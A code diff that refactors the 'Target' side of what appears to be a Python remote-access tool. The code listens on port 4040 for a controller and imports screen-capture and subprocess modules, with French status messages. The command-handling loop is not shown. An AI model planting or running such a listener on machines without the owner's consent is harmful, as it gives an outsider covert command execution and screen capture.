@@ -1,31 +1,12 @@
-import subprocess
-import os
-import platform
-from PIL import ImageGrab
-
 from base import *
-from commande_spliter import commande_spliter
+from PIL import ImageGrab
+import subprocess
+from spliter import commande_spliter
 
 
-class TargetSocket(BaseSocket):
-
-    PORT = 4040
-    IP = socket.gethostbyname(socket.gethostname())
-
-    def __init__(self, ip: str = IP, port: int = PORT):
+class Target(ServerSocket):
+    def __init__(self):
         super().__init__()
-        self.sock: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SOCK_STREAM)
-        self.sock.bind((ip, port))
-        self.clientaddress = (None, None)
-
-    def listen(self):
-        self.sock.listen()
-        print('📡 Attente de connexion sur ' + colored_info(f'{self.IP}:{self.PORT} 📡'))
-        self.clientsocket, self.clientaddress = self.sock.accept()
-        print(colored_success('✅ Connectee avec ') +
-              colored_info(f'{self.clientaddress[0]}:{self.clientaddress[1]} ✅\n'))
-        self.connected = True
 
     def run(self):
         while True:
@@ -98,6 +79,6 @@ class TargetSocket(BaseSocket):
 
 
 if __name__ == '__main__':
-    target = TargetSocket()
+    target = Target()
     target.listen()
     target.run()
